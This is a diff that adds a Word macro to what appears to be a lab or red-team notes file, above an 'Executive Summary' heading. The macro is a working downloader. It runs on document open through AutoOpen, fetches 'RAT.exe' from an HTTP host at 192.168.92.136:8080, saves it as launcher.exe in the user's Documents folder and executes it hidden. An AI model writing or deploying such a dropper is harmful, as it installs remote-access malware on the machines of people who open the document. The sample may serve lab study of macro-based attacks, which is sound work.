@@ -16,7 +16,28 @@ NOTES:
 
 <img width="890" height="139" alt="image" src="https://github.com/user-attachments/assets/71141d52-0e1a-4c7d-9525-ff37611a40a9" />
 
+word macro below:
+```
+Sub AutoOpen()
+    Dim strPath As String
+    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"
 
+    Dim objHTTP As Object
+    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+    objHTTP.Open "GET", "http://192.168.92.136:8080/RAT.exe", False
+    objHTTP.Send
+
+    Dim objStream As Object
+    Set objStream = CreateObject("ADODB.Stream")
+    objStream.Type = 1
+    objStream.Open
+    objStream.Write objHTTP.ResponseBody
+    objStream.SaveToFile strPath, 2
+    objStream.Close
+
+    CreateObject("WScript.Shell").Run "cmd /c """ & strPath & """", 0, False
+End Sub
+```
 
 
 ## 1. Executive Summary
